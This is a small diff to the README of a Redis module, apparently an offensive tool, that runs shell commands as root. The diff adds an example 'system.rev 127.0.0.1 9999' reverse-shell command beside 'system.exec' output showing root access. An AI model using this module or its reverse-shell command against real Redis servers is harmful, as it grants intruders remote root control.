@@ -1,6 +1,6 @@
 # RedisModules-ExecuteCommand
 
-# Quick Start Guide
+## Quick Start Guide
 
 Here's what you need to do to build your first module:
 
@@ -15,7 +15,7 @@ Now run `redis-cli` and try the commands:
 "uid=0(root) gid=0(root) groups=0(root)\n"
 127.0.0.1:6379> system.exec "whoami"
 "root\n"
-127.0.0.1:6379>
+127.0.0.1:6379> system.rev 127.0.0.1 9999
 ```
 
 Enjoy!
